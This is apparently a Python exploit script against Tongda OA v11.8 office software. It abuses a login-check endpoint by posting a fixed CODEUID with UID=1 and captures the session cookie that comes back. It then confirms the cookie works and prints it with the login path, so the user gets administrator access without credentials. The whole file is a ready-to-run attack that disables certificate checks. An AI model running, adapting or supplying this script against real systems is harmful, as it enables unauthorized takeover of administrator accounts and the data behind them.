import re
import time
import requests
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url=target_url+"general/login_code.php"
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding": "gzip"
    }
    hearderx={
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded"
        }
    exp_url=target_url+"logincheck_code.php"
    login_url=target_url+"general/index.php"
    data='CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1'
    success_msg = now_time() + '[SUCCESS]  获取到setcookie'
    warning_msg = now_time() + '[WARNING]  通达OA登录绕过漏洞不存在'
    error_msg = now_time() + '[通达OA_v11_8_logincheck][ERROR] 无法获取目标cookie，可能目标不存在'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=30)
        response = requests.post(url=exp_url, headers=hearderx, data=data, verify=False, timeout=30)
        tmp_cookie = response.headers['Set-Cookie']
        if len(tmp_cookie)>10:
            headers["Cookie"] = tmp_cookie
            check_available = requests.get(login_url,headers=headers,verify=False)
            shell_msg = now_time() + '请粘贴: {}".format(tmp_cookie),登录路径为:{}'.format(login_url)
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    return success_msg,shell_msg
            else:
                return warning_msg
    except:
        return error_msg

